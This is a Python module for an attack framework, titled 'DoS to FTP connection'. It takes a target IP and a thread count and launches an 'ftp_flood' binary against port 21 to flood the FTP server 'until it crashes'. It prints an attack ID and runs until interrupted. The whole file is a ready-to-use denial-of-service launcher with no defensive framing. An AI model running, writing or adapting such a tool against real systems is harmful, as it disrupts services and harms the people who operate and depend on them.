import subprocess
import smf

from lib.roar.callbin.calling import call_bin

MOD_INFO = {
    "Name": "DoS to FTP connection",
    "Description": """
Flooding an FTP network to disrupt its functionality
and make the server slow until it crashes.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["DoS", {"Description": "Sending annoying requests"}],
    ],
    "DefaultAction": "DoS",
    "License": "SMF License",
}
REQUIRED_OPTIONS = {"IP": "Fill in with target IP", "THREAD": "example: 1000"}


def execute(options):
    target = options.get("IP")
    port = "21"
    threads = options.get("THREAD")

    bin_path = call_bin("ftp_flood")

    if not target:
        smf.printf("[-] ERROR: TARGET is missing!")
        return

    smf.printf(f"[*] Preparing DoS to {target}:{port}")

    try:
        process = subprocess.Popen(
            [bin_path, "-t", target, "-p", port, "-w", threads],
            stdout=None,
            stderr=None,
        )

        smf.printf(f"[!] Attack ID: {process.pid}")
        smf.printf("[!] Press Ctrl+C to stop the flood.")

        process.wait()

    except KeyboardInterrupt:
        process.terminate()
    except Exception as e:
        smf.printf("[-] ERROR =>", e)
